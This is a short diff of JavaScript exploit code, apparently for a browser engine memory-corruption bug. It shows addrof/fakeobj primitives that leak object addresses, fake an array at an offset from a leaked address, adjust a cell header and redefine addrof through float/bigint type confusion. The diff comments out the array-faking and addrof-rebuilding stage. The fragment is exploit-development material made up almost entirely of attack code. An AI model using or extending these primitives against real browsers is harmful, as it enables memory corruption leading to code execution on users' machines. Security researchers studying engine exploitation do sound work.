@@ -124,7 +124,7 @@ var qwordAsFloat = qword => {
             let addr = addrof(obj);
             port.postMessage("obj @ " + addr.toString(16));
 
-            let fakeArr = fakeobj(addr + 0x10n);
+            /*let fakeArr = fakeobj(addr + 0x10n);
 
             // subtract off the incref
             doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
@@ -154,7 +154,7 @@ var qwordAsFloat = qword => {
             addrof = (val) => {
               b1[0] = val;
               return float2bigint(a1[0]);
-            }
+            }*/
             port.postMessage("got stableish addrof/fakeobj");
           }
 
